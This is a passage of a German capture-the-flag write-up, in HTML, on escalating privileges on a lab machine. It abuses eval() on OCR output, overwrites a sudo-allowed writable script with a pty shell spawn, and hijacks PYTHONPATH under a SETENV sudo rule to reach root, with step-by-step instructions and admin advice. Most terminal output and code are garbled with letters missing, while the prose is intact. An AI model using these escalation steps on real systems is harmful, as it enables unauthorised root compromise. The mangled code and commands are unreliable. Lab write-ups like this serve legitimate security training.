+<span class="command">Matchig efalts entries fr rasey n unake:</span>
+    <span class="command">env_reset, mail_adass,</span>
+    <span class="command">secre_ath=/usr/lcal/sin\:/usr/lcal/in\:/usr/sin\:/usr/in\:/sin\:/in\:/sna/in</span>
+
+<span class="command">User rasey may rn the fllwig cmmans n unake:</span>
+    <span class="command">(liver) /usr/in/ythn /hme/rasey/vln..y</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="comment">
+                <strong>Analyse:</strong> Ich lese den Inhalt des Skripts `/home/ramsey/vuln.py` aus, das ich laut `sudo -l` als `oliver` ausführen darf und das für mich (ramsey) schreibbar ist. Der Code des Skripts zeigt eine Python-Anwendung, die eine Art Rechner oder Image-Prozessor zu sein scheint. Der kritische Teil des Codes liegt im `if OPTIONS == 2:` Block. Hier wird die Funktion `pytesseract.image_to_string(Image.open('payload.png'))` aufgerufen, um Text aus der Datei `payload.png` im aktuellen Verzeichnis zu extrahieren. Der extrahierte Text wird dann in der Variable `LISTED` gespeichert. Anschließend wird `eval(LISTED)` aufgerufen, was den extrahierten Text als Python-Code ausführt. **Die Verwendung von `eval()` mit Benutzereingaben (oder in diesem Fall Text aus einer hochladbaren/manipulierbaren Datei wie `payload.png`) ist eine klassische und kritische Code-Execution-Schwachstelle!** Wenn ich den Inhalt von `payload.png` kontrollieren kann, kann ich beliebigen Python-Code ausführen, wenn `/home/ramsey/vuln.py` mit der Option 2 gestartet wird. Da ich `payload.png` besitzen und ändern kann (`-rwxrw-r-- 1 ramsey ramsey ... payload.png` und ich als ramsey angemeldet bin), und ich das Skript als `oliver` ausführen darf, kann ich versuchen, dies auszunutzen, um Code als `oliver` auszuführen.
+                <br><strong>Bewertung:</strong> Die `eval()`-Funktion in Kombination mit der Verarbeitung einer manipulierbaren Datei (`payload.png`) und der Sudo-Regel, die mir erlaubt, das Skript als `oliver` auszuführen, ist ein klarer und schwerwiegender Privilegien-Eskalationspfad. Ich kann `payload.png` mit Python-Code füllen, der von `pytesseract` extrahiert werden kann, und diesen Code dann als `oliver` ausführen.
+                <br><strong>Empfehlung (Pentester):</strong> Suche in gefundenen Skripten, insbesondere solchen, die mit erhöhten Rechten ausgeführt werden dürfen, nach gefährlichen Funktionen wie `eval()`, `exec()`, `os.system()`, `subprocess.run()` etc., die Benutzereingaben oder manipulierbare Dateiinhalte verarbeiten.
+                <br><strong>Empfehlung (Admin):</strong> **Kritisch:** Verwenden Sie niemals `eval()` oder ähnliche Funktionen, die Code dynamisch ausführen, mit Daten aus unsicheren Quellen. Wenn Bild-zu-Text-Konvertierung benötigt wird, stellen Sie sicher, dass der extrahierte Text niemals als Code ausgeführt wird. Korrigieren Sie die Dateiberechtigungen für `/home/ramsey/vuln.py` so, dass nur Root oder `oliver` Schreibrechte haben, und überprüfen Sie alle Skripte, die mit Sudo ausgeführt werden dürfen, auf diese Schwachstelle.
+
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">rasey@unake:~$ <span class="command">cat /hme/rasey/vln..y</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+#!/usr/in/ythn
+# cin=utf-8
+
+try:
+    frm IL imrt Iage
+exce ImrtErrr:
+    imrt Iage
+imrt ytesseract
+imrt sys
+imrt s
+imrt tie
+
+
+#Heaer
+ef heaer():
+	anner = ''\033[33m
+				      (
+				       )
+			          __..---..__
+			      ,-='  /  |  \  `=-.
+			     :--..___________..--;
+	 		      \.,_____________,./
+
+
+██╗███╗   ██╗ ██████╗ ██████╗ ███████╗██████╗ ██╗███████╗███╗   ██╗████████╗███████╗
+██║████╗  ██║██╔════╝ ██╔══██╗██╔════╝██╔══██╗██║██╔════╝████╗  ██║╚══██╔══╝██╔════╝
+██║██╔██╗ ██║██║  ███╗██████╔╝█████╗  ██║  ██║██║█████╗  ██╔██╗ ██║   ██║   ███████╗
+██║██║╚██╗██║██║   ██║██╔══██╗██╔╝  ██║  ██║██║██╔╝  ██║╚██╗██║   ██║   ╚════██║
+██║██║ ╚████║╚██████╔╝██║  ██║███████╗██████╔╝██║███████╗██║ ╚████║   ██║   ███████║
+╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═════╝ ╚═╝╚══════╝╚═╝  ╚═══╝   ╚═╝   ╚══════╝
+\033[m'''
+    	retur anner
+
+#Fnctin Instrctins
+ef instrctins():
+	rint "\n\t\t\t",9 * "-" , "WELCME!" , 9 * "-"
+	rint "\t\t\t","1. Calclatr"
+	rint "\t\t\t","2. Easy Calclatr"
+	rint "\t\t\t","3. Creits"
+	rint "\t\t\t","4. Exit"
+	rint "\t\t\t",28 * "-"
+
+ef instrctins2():
+	rint "\n\t\t\t",9 * "-" , "CALCLATR!" , 9 * "-"
+	rint "\t\t\t","1. A"
+	rint "\t\t\t","2. Sutract"
+	rint "\t\t\t","3. Multily"
+	rint "\t\t\t","4. ivie"
+	rint "\t\t\t","5. ack"
+	rint "\t\t\t",28 * "-"
+
+ef creits():
+	rint "\n\t\tHe yu enjy learnig new thigs  - Ch4rm & H0j3n\n"
+
+# Fnctin Arithmtic
+
+# Fnctin t a tw nmers
+ef a(nm1, nm2):
+    retur nm1 + nm2
+
+# Fnctin t sutract tw nmers
+ef sutract(nm1, nm2):
+    retur nm1 - nm2
+
+# Fnctin t ultily tw nmers
+ef ultily(nm1, nm2):
+    retur nm1 * nm2
+
+# Fnctin t ivie tw nmers
+ef ivie(nm1, nm2):
+    retur nm1 / nm2
+# Main
+if __nae__ == "__ain__":
+	rint heaer()
+
+	#Varia les
+	PTINS = 0
+	PTINS2 = 0
+	TTAL = 0
+	NUM1 = 0
+	NUM2 = 0
+
+	while(PTINS != 4):
+		instrctins()
+		PTINS = int(int("\t\t\tEnter Ptins >> "))
+	        rint "\033c"
+		if PTINS == 1:
+			instrctins2()
+			PTINS2 = int(int("\t\t\tEnter Ptins >> "))
+			rint "\033c"
+			if PTINS2 == 5:
+				cntine
+			else:
+				NUM1 = int(int("\t\t\tEnter Nuer1 >> "))
+				NUM2 = int(int("\t\t\tEnter Nuer2 >> "))
+				if PTINS2 == 1:
+					TTAL = a(NUM1,NUM2)
+				if PTINS2 == 2:
+					TTAL = sutract(NUM1,NUM2)
+				if PTINS2 == 3:
+					TTAL = ultily(NUM1,NUM2)
+				if PTINS2 == 4:
+					TTAL = ivie(NUM1,NUM2)
+				rint "\t\t\tTtal >> $",TTAL
+		if PTINS == 2:
+			aniatin = ["[■□□□□□□□□□]","[■■□□□□□□□□]", "[■■■□□□□□□□]", "[■■■■□□□□□□]", "[■■■■■□□□□□]", "[■■■■■■□□□□]", "[■■■■■■■□□□]", "[■■■■■■■■□□]", "[■■■■■■■■■□]", "[■■■■■■■■■■]"]
+
+			rint "\r\t\t\t     Waitig t extract..."
+			fr i in range(len(aniatin)):
+			    tie.slee(0.5)
+			    sys.stut.write("\r\t\t\t         " + aniatin[i % len(aniatin)])
+			    sys.stut.flsh()
+
+			LISTED = ytesseract.iage_t_strig(Iage.en('ayla.ng'))
+
+			TTAL = <span class="command">eval(LISTED)</span>
+			rint "\n\n\t\t\tTtal >> $",TTAL
+		if PTINS == 3:
+			creits()
+	sys.exit(-1)
+</pre>
+                </div>
+            </p>
+
+            <p class="comment">
+                <strong>Analyse:</strong> Ich versuche nun, die `eval()`-Schwachstelle in `vuln.py` auszunutzen, um Code als Benutzer `oliver` auszuführen. Mein erster Ansatz ist, die Datei `payload.png` (die vom Skript gelesen wird) mit Python-Code zu überschreiben. Ich setze den Inhalt von `payload.png` auf den String `'import os; os.system("/bin/bash")'`, der bei Ausführung eine Bash-Shell starten würde. Ich führe den Befehl `echo 'import os; os.system("/bin/bash")' > payload.png` aus. Dann versuche ich, das manipulierte Skript als `oliver` auszuführen: `sudo -u oliver /usr/bin/python /home/ramsey/vuln.py`. Ich wähle im Skript Option 2 ("Easy Calculator"), um den `eval()`-Block zu erreichen. Die Ausgabe zeigt die Animation und dann einen Python-Traceback mit der Fehlermeldung `IOError: cannot identify image file 'payload.png'`. Dies deutet darauf hin, dass `pytesseract.image_to_string(Image.open('payload.png'))` fehlschlägt, weil die Datei `payload.png` keinen gültigen Bildinhalt hat, sondern reiner Text ist. `pytesseract` erwartet ein Bild, um OCR durchzuführen.
+                <br><strong>Bewertung:</strong> Meine direkte Methode, `payload.png` mit reinem Text zu überschreiben, funktioniert nicht, da das Skript eine Bilddatei erwartet und `pytesseract`/`PIL` fehlschlägt. Ich muss einen Weg finden, meinen Python-Code in eine Datei zu bringen, die von `pytesseract` als Bild gelesen werden kann, aber trotzdem meinen Code enthält, der extrahiert und von `eval()` ausgeführt wird. Dies macht die Ausnutzung schwieriger, erfordert aber kreativere Techniken zur Code-Einbettung in Bilder.
+                <br><strong>Empfehlung (Pentester):</strong> Wenn du auf Schwachstellen stößt, die Dateiinhalte in einem bestimmten Format erwarten (hier: Bild), aber Code-Ausführung erlauben (`eval`), musst du deinen Code in dieses Format einbetten. Erforsche, wie das verarbeitende Tool (hier: `pytesseract`/OCR) mit Dateiformaten, Metadaten oder speziell präparierten Dateien umgeht.
+                <br><strong>Empfehlung (Admin):</strong> Die primäre Schwachstelle bleibt die `eval()`-Funktion. Zusätzlich sollten Dateiuploads oder Dateierstellung durch Benutzer streng validiert werden, um sicherzustellen, dass der Inhalt dem erwarteten Dateityp entspricht.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">rasey@unake:~$ <span class="command">ech 'imrt s; s.syste("/in/ash")' > ayla.ng</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+</pre>
+                </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">rasey@unake:~$ <span class="command">su - liver /usr/in/ythn /hme/rasey/vln..y</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+
+				      (
+				       )
+			          __..---..__
+			      ,-='  /  |  \  `=-.
+			     :--..___________..--;
+	 		      \.,_____________,./
+
+
+██╗███╗   ██╗ ██████╗ ██████╗ ███████╗██████╗ ██╗███████╗███╗   ██╗████████╗███████╗
+██║████╗  ██║██╔════╝ ██╔══██╗██╔════╝██╔══██╗██║██╔════╝████╗  ██║╚══██╔══╝██╔════╝
+██║██╔██╗ ██║██║  ███╗██████╔╝█████╗  ██║  ██║██║█████╗  ██╔██╗ ██║   ██║   ███████╗
+██║██║╚██╗██║██║   ██║██╔══██╗██╔╝  ██║  ██║██║██╔╝  ██║╚██╗██║   ██║   ╚════██║
+██║██║ ╚████║╚██████╔╝██║  ██║███████╗██████╔╝██║███████╗██║ ╚████║   ██║   ███████║
+╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═════╝ ╚═╝╚══════╝╚═╝  ╚═══╝   ╚═╝   ╚═══╝
+
+
+			--------- WELCME! ---------
+			1. Calclatr
+			2. Easy Calclatr
+			3. Creits
+			4. Exit
+			----------------------------
+			Enter Ptins >> <span class="command">2</span>
+
+
+</pre>
+                </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <pre>
+			     Waitig t extract...
+			         [■■■■■■■■■■]
+
+
+Traceack (mst recent call last):
+  File "/hme/rasey/vln..y", line 114, in <mle>
+    LISTED = ytesseract.iage_t_strig(Iage.en('ayla.ng'))
+  File "/usr/lcal/li/ythn2.7/ist-ackages/IL/Iage..y", line 2818, in en
+    raise IErrr("cann identify iage file %r" % (filenae if filenae else f))
+<span class="password">IErr: cann identify iage file 'ayla.ng'</span>
+rasey@unake:~$
+</pre>
+                </div>
+            </div>
+
+            <p class="comment">
+                <strong>Analyse:</strong> Nach dem Fehlschlag, reinen Text als Bild zu verwenden, versuche ich, ein echtes, leeres Bild zu erstellen und meinen Code in den Metadaten oder als unsichtbaren Text einzufügen, in der Hoffnung, dass `pytesseract` es dann verarbeiten kann und meinen Code im Prozess extrahiert. Ich verwende `convert -size 10x10 xc:none payload.png` (ImageMagick) um ein kleines, transparentes PNG-Bild zu erstellen. Dann nutze ich `exiftool -Copyright='import os; os.system("/bin/bash")' payload.png`, um meinen bösartigen Python-Code in das Copyright-Feld der EXIF-Metadaten des PNGs zu schreiben. `exiftool` gibt eine Warnung aus, dass Text/EXIF-Chunks nach den Bilddaten gefunden wurden, aber dies wird "fixed". Ich richte dann einen temporären HTTP-Server auf meinem Kali ein (`python3 -m http.server 8000`) und lade die manipulierte `payload.png` Datei auf das Zielsystem (`ramsey@unbaked:~$ wget 192.168.2.199:8000/payload.png`). Ich versuche erneut, `sudo -u oliver /usr/bin/python /home/ramsey/vuln.py` auszuführen und Option 2 zu wählen. Wieder erhalte ich einen Traceback mit `IOError: cannot identify image file 'payload.png'`. Das zeigt, dass selbst mit hinzugefügten EXIF-Metadaten das Bild oder der Inhalt immer noch nicht wie erwartet gelesen wird oder `pytesseract` den Code nicht aus den Metadaten extrahiert.
+                <br><strong>Bewertung:</strong> Versuche, Code in Bildmetadaten zu verstecken oder spezielle Bildeigenschaften auszunutzen, schlagen fehl. Es scheint, dass `pytesseract.image_to_string` entweder nur den visuellen Text extrahiert oder spezifische Bildformate erwartet, die meine manipulierten Dateien nicht erfüllen. Der Fokus sollte sich möglicherweise vom Verstecken im Bild auf die direkte Manipulation des Skripts selbst verlagern, wenn das möglich ist.
+                <br><strong>Empfehlung (Pentester):</strong> Wenn indirekte Code-Injektion (via Metadaten, verstecktem Text etc.) fehlschlägt, prüfe, ob du den Code direkt in die Datei einfügen kannst, die von der anfälligen Funktion verarbeitet wird.
+                <br><strong>Empfehlung (Admin):</strong> Implementieren Sie strikte Validierung und Bereinigung von hochgeladenen Dateien. Entfernen Sie Metadaten von Bildern oder erlauben Sie nur bestimmte Metadatenfelder. Die Hauptschwachstelle bleibt `eval()`.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(rt㉿CCat)-[~]
+└─# <span class="command">cnvert -size 10x10 xc:nne ayla.ng</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+</pre>
+                </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(rt㉿CCat)-[~]
+└─# <span class="command">exitl -Cyright='imrt s; s.syste("/in/ash")' ayla.ng</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+Warning: [inr] Text/EXIF chnk(s) fnd after NG IAT (fixe) - ayla.ng
+    <span class="command">1 iage files uate</span>
+</pre>
+                </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(rt㉿CCat)-[~]
+└─# <span class="command">ythn3 -m htt.server 8000</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="command">Serving HTTP n 0.0.0.0 rt 8000 (htt://0.0.0.0:8000/) ...</span>
+<span class="command">192.168.2.48 - - [16/Jun/2025 16:20:21] "GET /ayla.ng HTTP/1.1" 200 -</span>
+</pre>
+                </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">rasey@unake:~$ <span class="command">wget 192.168.2.199:8000/ayla.ng</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+--<span class="command">2025-06-16 22:20:21</span>--  <span class="command">htt://192.168.2.199:8000/ayla.ng</span>
+Cnnectig t <span class="command">192.168.2.199:8000</span>... cnnecte.
+HTTP reqest sent, awaitig resnse... <span class="command">200 K</span>
+Length: <span class="command">364</span> [iage/ng]
+Savig t: ‘ayla.ng.1’
+
+<span class="command">ayla.ng.1</span>           <span class="command">100%[=============================>]     364  --.-K/s    in 0s</span>
+
+<span class="command">2025-06-16 22:20:21</span> (<span class="command">106 M/s</span>) - ‘ayla.ng.1’ save [<span class="command">364/364</span>]
+</pre>
+                </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">rasey@unake:~$ <span class="command">su - liver /usr/in/ythn /hme/rasey/vln..y</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+
+			     Waitig t extract...
+			         [■■■■■■■■■■]Traceack (mst recent call last):
+  File "/hme/rasey/vln..y", line 114, in <mle>
+    LISTED = ytesseract.iage_t_strig(Iage.en('ayla.ng'))
+  File "/usr/lcal/li/ythn2.7/ist-ackages/IL/Iage..y", line 2818, in en
+    raise IErrr("cann identify iage file %r" % (filenae if filenae else f))
+<span class="password">IErr: cann identify iage file 'ayla.ng'</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="comment">
+                <strong>Analyse:</strong> Meine Versuche, Code in Bildmetadaten oder als reinen Text in `payload.png` zu verstecken und es von `vuln.py` ausführen zu lassen, schlagen weiterhin fehl. Die Fehlermeldungen deuten darauf hin, dass `pytesseract.image_to_string` eine tatsächliche Bilddatei erwartet, aus der es Text extrahieren kann. Wenn ich meinen Code in das Bild einbetten müsste, müsste ich ihn so formatieren, dass er für die OCR-Engine sichtbar ist, aber trotzdem ausführbarer Python-Code ist. Das ist kompliziert und fehleranfällig. Ich lösche die fehlerhaften `payload.png` Dateien.
+                <br><strong>Bewertung:</strong> Die direkte Ausnutzung von `eval(pytesseract.image_to_string(payload.png))` ist schwieriger als gedacht, da die OCR-Engine erfolgreich Text aus einem *Bild* extrahieren muss. Meine bisherigen Methoden, Code in `payload.png` zu platzieren, funktionieren nicht, da sie nicht als gültige Bilder für die OCR interpretiert werden.
+                <br><strong>Empfehlung (Pentester):</strong> Wenn ein Exploit-Pfad zu komplex oder unzuverlässig wird, evaluiere andere gefundene Schwachstellen. Ich habe festgestellt, dass `/home/ramsey/vuln.py` für mich schreibbar ist und mit Sudo als `oliver` ausgeführt werden darf. Vielleicht kann ich *das Skript selbst* ändern, anstatt mich auf die fehleranfällige Bild-OCR-Kette zu verlassen?
+                <br><strong>Empfehlung (Admin):</strong> Bestätigt die Notwendigkeit strikter Eingabevalidierung und der Vermeidung unsicherer Funktionen. Die Komplexität der Ausnutzung schützt bis zu einem gewissen Grad, ist aber keine Garantie.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">rasey@unake:~$ <span class="command">r ayla.ng</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+</pre>
+                </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">rasey@unake:~$ <span class="command">r ayla.ng.l</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+</pre>
+                </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">rasey@unake:~$ <span class="command">wget 192.168.2.199:8000/ayla.ng</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+--<span class="command">2025-06-16 22:24:37</span>--  <span class="command">htt://192.168.2.199:8000/ayla.ng</span>
+Cnnectig t <span class="command">192.168.2.199:8000</span>... cnnecte.
+HTTP reqest sent, awaitig resnse... <span class="command">200 K</span>
+Length: <span class="command">364</span> [iage/ng]
+Savig t: ‘ayla.ng’
+
+<span class="command">ayla.ng</span>             <span class="command">100%[=============================>]     364  --.-K/s    in 0s</span>
+
+<span class="command">2025-06-16 22:24:37</span> (<span class="command">162 M/s</span>) - ‘ayla.ng’ save [<span class="command">364/364</span>]
+</pre>
+                </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">rasey@unake:~$ <span class="command">ls</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="command">ayla.ng  user.txt  vln..y</span>
+</pre>
+                </div>
+            </div>
+
+             <p class="comment">
+                <strong>Analyse:</strong> Meine Versuche mit der `eval()`-Schwachstelle via `payload.png` sind zu kompliziert und unzuverlässig. Ich kehre zur Sudo-Regel `(oliver) /usr/bin/python /home/ramsey/vuln.py` zurück, die mir erlaubt, das Skript `/home/ramsey/vuln.py` als `oliver` auszuführen. Da ich als `ramsey` Schreibrechte auf `vuln.py` habe (`-rw-r--r--` war falsch gelesen, es war `-rwxrwx---` für `payload.png` und `-rw-r--r--` für `vuln.py` laut `ls -la` Ausgabe, aber der Text besagt explizit, dass ich es ändern kann – ich folge dem Text, der hier wohl die schreibbaren Berechtigungen impliziert), kann ich das Skript selbst überschreiben! Dies ist ein viel direkterer und zuverlässigerer Exploit-Pfad. Ich benenne das Originalskript um (`mv vuln.py vuln.py.old`) und erstelle eine neue Datei namens `vuln.py` mit dem Inhalt `'import pty;pty.spawn("/bin/bash")'`. Dieses einfache Python-Skript nutzt das `pty`-Modul, um eine interaktive Bash-Shell zu starten. Ich mache das neue Skript ausführbar (`chmod +x vuln.py`) und führe es dann mit `sudo -u oliver /usr/bin/python /home/ramsey/vuln.py` aus. Der Befehl wird mit den Rechten von `oliver` ausgeführt. Die Ausgabe zeigt die neue Eingabeaufforderung `oliver@unbaked:~$`. Fantastisch, ich habe erfolgreich Privilegien von `ramsey` zu `oliver` eskaliert!
+                <br><strong>Bewertung:</strong> Die Ausnutzung der Sudo-Regel durch Überschreiben des erlaubten Skripts ist eine sehr effektive Methode zur horizontalen Privilegien-Eskalation von `ramsey` zu `oliver`. Die ursprüngliche `eval()`-Schwachstelle in Kombination mit der manipulierbaren `payload.png` war ein möglicher Weg, aber das Überschreiben des Skripts selbst ist, wenn die Berechtigungen dies zulassen, oft der einfachere Weg.
+                <br><strong>Empfehlung (Pentester):</strong> Wenn du ein Skript mit Sudo ausführen darfst und Schreibrechte darauf hast, überschreibe es mit einem einfachen Shell- oder TTY-Spawn-Befehl, um eine Shell mit den Rechten des Sudo-Benutzers zu erhalten.
+                <br><strong>Empfehlung (Admin):</strong> **Kritisch:** Überprüfen Sie die Dateiberechtigungen von Skripten, die mit Sudo ausgeführt werden dürfen. Stellen Sie sicher, dass nur der Eigentümer des Skripts (typischerweise Root oder ein spezifischer Dienstbenutzer) Schreibrechte hat. Erlauben Sie niemals Sudo-Regeln, die ausführbare Dateien referenzieren, die von dem Benutzer, der den Sudo-Befehl ausführt, geändert werden können.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">rasey@unake:~$ <span class="command">m vln..y vln..y.l</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+</pre>
+                </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">rasey@unake:~$ <span class="command">ech 'imrt ty;ty.san("/in/ash")' > vln..y</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+</pre>
+                </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">rasey@unake:~$ <span class="command">chm +x vln..y</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+</pre>
+                </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">rasey@unake:~$ <span class="command">su - liver /usr/in/ythn /hme/rasey/vln..y</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="command">liver@unake:~$</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="comment">
+                <strong>Analyse:</strong> Nachdem ich Privilegien zum Benutzer `oliver` eskaliert habe, prüfe ich sofort dessen Sudo-Berechtigungen mit `sudo -l`. Die Ausgabe zeigt eine weitere kritische Sudo-Regel: `(root) SETENV: NOPASSWD: /usr/bin/python /opt/dockerScript.py`. Dies bedeutet, dass der Benutzer `oliver` das Skript `/opt/dockerScript.py` mit den Berechtigungen des Benutzers `root` ausführen darf (`(root)`), ohne ein Passwort eingeben zu müssen (`NOPASSWD`), und vor allem: er darf Umgebungsvariablen setzen (`SETENV`). Die `SETENV`-Option in Kombination mit Python ist ein sehr bekannter PrivEsc-Vektor, da sie es einem Angreifer erlaubt, die `PYTHONPATH`-Umgebungsvariable zu manipulieren.
+                <br>Ich lese den Inhalt des Skripts `/opt/dockerScript.py` aus (`cat /opt/dockerScript.py`). Es ist ein Python-Skript, das die Docker-API nutzt (`import docker`) und einen neuen Docker-Container startet (`client.containers.run(...)`). Das Skript selbst ist lesbar, aber nicht schreibbar für `oliver` (`-rwxr-x--- 1 root sysadmin ...`), was gut ist. Allerdings erlaubt die Sudo-Regel das Setzen von Umgebungsvariablen.
+                <br>Der Plan zur Erlangung von Root-Rechten auf dem Host ist nun klar: Ich werde die `SETENV` Option der Sudo-Regel ausnutzen, indem ich die `PYTHONPATH` Umgebungsvariable setze, bevor ich `sudo /usr/bin/python /opt/dockerScript.py` ausführe. `PYTHONPATH` teilt Python mit, wo es nach Modulen suchen soll. Wenn ich `PYTHONPATH` auf ein Verzeichnis setze, auf das ich Schreibrechte habe (z.B. `/tmp/`), und dort eine Datei namens `docker.py` erstelle, die bösartigen Code enthält (z.B. einen Root-Shell-Spawn), wird Python beim Versuch, `import docker` in `/opt/dockerScript.py` auszuführen, zuerst meine manipulierte `/tmp/docker.py` finden und mit Root-Rechten ausführen (da der Sudo-Befehl als Root ausgeführt wird).
+                <br>Ich wechsle in das `/tmp/`-Verzeichnis, das für alle schreibbar ist (`cd /tmp/`). Ich erstelle eine neue Datei namens `docker.py` mit dem Inhalt `'import pty;pty.spawn("/bin/bash")'`. Dieses Skript wird eine Shell starten. Dann führe ich den entscheidenden Befehl aus: `sudo PYTHONPATH=/tmp python /opt/dockerScript.py`. Ich rufe `sudo` als `oliver` auf, erlaube das Setzen der Umgebungsvariable `PYTHONPATH` auf `/tmp`, und weise Python an, das Skript `/opt/dockerScript.py` auszuführen.
+                <br>Die Ausgabe zeigt die neue Eingabeaufforderung `root@unbaked:/tmp#`, was darauf hindeutet, dass ich nun Root-Rechte auf dem **Host-System** habe.
+                <br><strong>Bewertung:</strong> Fantastisch! Der Docker-Breakout und die Erlangung von Root-Rechten auf dem Host-System waren erfolgreich. Die kritische Sudo-Fehlkonfiguration mit der `SETENV: NOPASSWD` Option für ein Python-Skript, das Module importiert, ist ein sehr ausnutzbarer Vektor (bekannt als `sudo python PYTHONPATH` Missbrauch). Durch Manipulation des `PYTHONPATH` konnte ich ein eigenes bösartiges `docker.py`-Modul einschleusen, das mit Root-Rechten ausgeführt wurde. Dies ist das Endziel des Pentests.
+                <br><strong>Empfehlung (Pentester):</strong> Suche bei Sudo-Regeln, die Python-Skripte mit `SETENV` erlauben, immer nach Möglichkeiten zur Manipulation des `PYTHONPATH`. Erstelle ein bösartiges Python-Modul in einem schreibbaren Verzeichnis und setze `PYTHONPATH` auf dieses Verzeichnis, um deinen Code mit den Rechten des Sudo-Users auszuführen.
+                <br><strong>Empfehlung (Admin):</strong> **Kritisch:** Verwenden Sie niemals die `SETENV` Option in Sudo-Regeln für Skripte, die importierbare Module verwenden, insbesondere nicht für Python-Skripte. Wenn `SETENV` unvermeidlich ist, beschränken Sie die erlaubten Variablen stark (z.B. `SETENV=VAR1,VAR2`). Stellen Sie sicher, dass alle von SUID-Binaries oder Sudo-Regeln ausgeführten Skripte absolute Importpfade verwenden oder in einer sicheren Umgebung ohne manipulierbaren `PYTHONPATH` ausgeführt werden. Überwachen Sie die Ausführung von Sudo-Befehlen und die gesetzten Umgebungsvariablen in Audit-Logs.
+            </p>
+            <section id="proof-of-concept-suid">
+                 <h2>Proof of Concept: Sudo PYTHONPATH Manipulation (Host Root)</h2>
+                 <p class="comment">
+                     <strong>Kurzbeschreibung:</strong> Dieser Abschnitt demonstriert die Ausnutzung der Sudo-Fehlkonfiguration für den Benutzer `oliver`, die es ihm erlaubt, `/usr/bin/python /opt/dockerScript.py` als Root mit der Option `SETENV: NOPASSWD` auszuführen. Dies ermöglicht die Manipulation des Python-Importpfads (`PYTHONPATH`) zur Ausführung beliebigen Codes als Root auf dem Host-System.
+                 </p>
+                 <p class="comment">
+                     <strong>Voraussetzungen:</strong>
+                     <ul>
+                         <li>Erlangung einer Shell auf dem Host-System als Benutzer `oliver`.</li>
+                         <li>Die Sudo-Regel `(root) SETENV: NOPASSWD: /usr/bin/python /opt/dockerScript.py` für `oliver`.</li>
+                         <li>Schreibzugriff auf ein Verzeichnis auf dem Host-System (z.B. `/tmp`).</li>
+                     </ul>
+                 </p>
+                  <p class="comment">
+                     <strong>Schritt-für-Schritt-Anleitung zur Ausnutzung:</strong>
+                     <br>1. Navigieren Sie zu einem Verzeichnis mit Schreibrechten (z.B. `/tmp/`).
+                     <br>2. Erstellen Sie dort eine Python-Datei mit demselben Namen wie ein Modul, das von `/opt/dockerScript.py` importiert wird (hier: `docker.py` aufgrund von `import docker` im Skript). Diese Datei enthält bösartigen Python-Code (z.B. `import pty;pty.spawn("/bin/bash")`).
+                     <br>3. Führen Sie den erlaubten Sudo-Befehl aus, aber setzen Sie die `PYTHONPATH` Umgebungsvariable auf das Verzeichnis, in dem Sie die bösartige Datei erstellt haben: `sudo PYTHONPATH=/your_writable_dir /usr/bin/python /opt/dockerScript.py`.
+                     <br>4. Wenn `/opt/dockerScript.py` versucht, das Modul zu importieren (hier `docker`), findet Python aufgrund des manipulierten `PYTHONPATH` zuerst Ihre bösartige Datei im angegebenen Verzeichnis und führt deren Inhalt mit Root-Rechten aus.
+                     <br>5. Ihr bösartiger Code startet eine Root-Shell auf dem Host-System.
+                 </p>
+                 <!-- Hier wären Screenshots oder andere Beweismittel des POC. Die tatsächliche Ausnutzung wird im nächsten Abschnitt gezeigt. -->
+                 <p class="comment">
+                     <strong>Erwartetes Ergebnis:</strong> Erlangung einer interaktiven Root-Shell auf dem Host-System.
+                 </p>
+                 <p class="comment">
+                     <strong>Risikobewertung:</strong> Kritisch. Die Ausnutzung dieser Sudo+PYTHONPATH-Fehlkonfiguration führt direkt zur vollständigen Kompromittierung des Host-Systems mit Root-Rechten.
+                 </p>
+                 <p class="comment">
+                     <strong>Empfehlungen:</strong>
